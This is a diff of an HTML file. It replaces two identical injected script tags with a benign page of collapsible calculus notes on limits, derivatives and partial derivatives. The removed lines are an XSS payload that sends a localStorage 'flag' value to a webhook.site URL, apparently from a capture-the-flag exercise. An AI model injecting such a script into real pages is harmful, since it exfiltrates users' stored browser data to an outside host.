@@ -1,6 +1,47 @@
-<script>
-fetch('https://webhook.site/013685aa-60a1-4f28-ab91-0a491d19a2c8?flag=' + localStorage.getItem('flag'));
-</script>
-<script>
-fetch('https://webhook.site/013685aa-60a1-4f28-ab91-0a491d19a2c8?flag=' + localStorage.getItem('flag'));
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interactive Math Notes</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; }
+        .container { max-width: 800px; margin: auto; padding: 20px; }
+        .section { border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; cursor: pointer; background: #f9f9f9; }
+        .content { display: none; padding: 10px; border-top: 1px solid #ddd; }
+        .exercise { background: #e3f2fd; padding: 10px; margin-top: 10px; }
+    </style>
+    <script>
+        function toggleContent(id) {
+            var content = document.getElementById(id);
+            content.style.display = content.style.display === 'block' ? 'none' : 'block';
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Interactive Math Notes</h1>
+        
+        <div class="section" onclick="toggleContent('limits')">Limits & Continuity</div>
+        <div class="content" id="limits">
+            <p><strong>Definition:</strong> A limit describes the behavior of a function as it approaches a specific point.</p>
+            <p><strong>Example:</strong> \( \lim_{x \to 2} (3x + 1) = 7 \)</p>
+            <div class="exercise">Try finding: \( \lim_{x \to 5} (2x^2 - 3) \)</div>
+        </div>
+        
+        <div class="section" onclick="toggleContent('derivatives')">Derivatives</div>
+        <div class="content" id="derivatives">
+            <p><strong>Definition:</strong> The derivative measures the rate of change of a function.</p>
+            <p><strong>Example:</strong> \( f(x) = x^2 \), then \( f'(x) = 2x \).</p>
+            <div class="exercise">Find \( \frac{d}{dx} (x^3 + 2x) \).</div>
+        </div>
+        
+        <div class="section" onclick="toggleContent('multivariable')">Multivariable Calculus</div>
+        <div class="content" id="multivariable">
+            <p><strong>Definition:</strong> Functions with more than one variable (e.g., \( f(x, y) \)).</p>
+            <p><strong>Example:</strong> \( f(x, y) = x^2 + y^2 \) is a function of two variables.</p>
+            <div class="exercise">Find \( \frac{\partial}{\partial x} (x^2y + 3y) \).</div>
+        </div>
+    </div>
+</body>
+</html>
